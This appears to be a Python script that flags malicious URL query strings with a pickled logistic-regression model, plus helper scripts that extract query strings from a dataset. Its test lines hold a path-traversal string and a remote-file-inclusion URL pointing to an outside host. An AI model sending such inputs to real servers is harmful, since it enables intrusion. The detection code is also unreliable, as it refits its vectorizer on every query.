import pickle, urllib.parse
from sklearn.feature_extraction.text import TfidfVectorizer


'''
Sentiment analysis module for query string, (for training the model -->query_string_analyzer_PICKLE.py)
'''

N = 3       # Ngram value
RANDOM_STATE = 123


def load_pickle(filename):
    load_file = open(filename, 'rb')
    classifier = pickle.load(load_file)
    load_file.close()
    return classifier


def n_gram_tokenizer(query_string):
    n_grams = []
    if len(query_string) <= N/2:      # too short, it's a token itself
        n_grams.append(query_string)
        return n_grams
    for i in range(0, len(query_string) - N):
        n_grams.append(query_string[i:i + N])
    return n_grams


LogisticRegressionClassifier = load_pickle("classifiers/LogisticRegression_Classifier.pickle")
vectorizer = TfidfVectorizer(tokenizer=n_gram_tokenizer)
# X = vectorizer.fit_transform(all_queries)   # convert inputs to vectors


def pre_process(query):
    datas = []
    data = str(urllib.parse.unquote(query))     # converting encoded url to simple string
    datas.append(data)
    X = vectorizer.fit_transform(datas)
    return X


def sentiment(query):
    data = pre_process(query)
    return LogisticRegressionClassifier.predict(data)
#todo ritornare tupla (sentiment, accuracy)

'''
TESTING

from query_string_analyzer import sentiment as s

print(s("/google.com/"))
print(s("/google.com/../../../***/"))
print(s("/google.com/"))
'''

#script 1
def get_querystring(url):
    index = url.find('?')
    if index != -1:
        return url[index+1:]

    #dont have querystring
    return None

print(get_querystring("/ex/modules/threadstop/threadstop.php?exbb[home_path]=http://192.168.202.96:8080/frznctvhi0i5??"))

result = []
lines = []
i=0

with open("dataset/myDataset/good.txt", "r") as input_file:
    lines = input_file.readlines()

for line in lines:
    query_string = get_querystring(line)
    if query_string != None:
        result.append(query_string)
        i += 1

with open("out.txt", "w") as out:
    for r in result:
        out.write(r)

#scrit 2
file_lines = []

with open("out.txt", "r") as input_file:
    file_lines = input_file.readlines()

result = list(set(file_lines))

with open("out.txt", "w") as out:
    for r in result:
        out.write(r)